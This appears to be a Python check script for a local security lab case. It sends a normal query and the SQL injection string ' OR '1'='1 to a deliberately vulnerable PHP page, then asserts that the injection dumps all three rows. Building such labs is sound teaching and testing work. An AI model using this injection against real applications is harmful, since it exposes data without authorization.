#!/usr/bin/env python3

import http.client
import urllib.parse
import re
import html

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S007/index.php"

def fetch_rows(name):
    query = urllib.parse.urlencode({"name": name})
    path = PATH + "?" + query
    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
    try:
        conn.request("GET", path, headers={"Host": f"{HOST}:{PORT}"})
        resp = conn.getresponse()
        status = resp.status
        body = resp.read().decode("utf-8", "replace")
    finally:
        conn.close()

    if status != 200:
        raise RuntimeError(f"unexpected HTTP status: {status}")

    rows = []
    for match in re.finditer(r'<p>\s*ID\s*(\d+)\s*：\s*([^<]*)</p>', body):
        row_id = match.group(1)
        row_name = html.unescape(match.group(2)).strip()
        rows.append((row_id, row_name))
    return rows, body

def main():
    normal_rows, _ = fetch_rows("Alice")
    test_rows, _ = fetch_rows("' OR '1'='1")

    expected_normal = [("1", "Alice")]
    expected_test = [("1", "Alice"), ("2", "Bob"), ("3", "Carol")]

    print("normal rows:", normal_rows)
    print("test rows:", test_rows)

    if not (len(normal_rows) == 1 and set(normal_rows) == set(expected_normal)):
        raise AssertionError(
            "普通请求未按预期只返回 Alice；请检查入口、数据库连接、lab_people 数据和响应页面。"
        )

    if not (len(test_rows) == 3 and set(test_rows) == set(expected_test)):
        raise AssertionError(
            "测试请求未返回三条受控业务记录；请检查数据库连接、表数据和 SQL 错误页。"
        )

    print("PASS: 普通请求仅返回 Alice，测试请求返回 Alice/Bob/Carol 三条记录。")

if __name__ == "__main__":
    main()
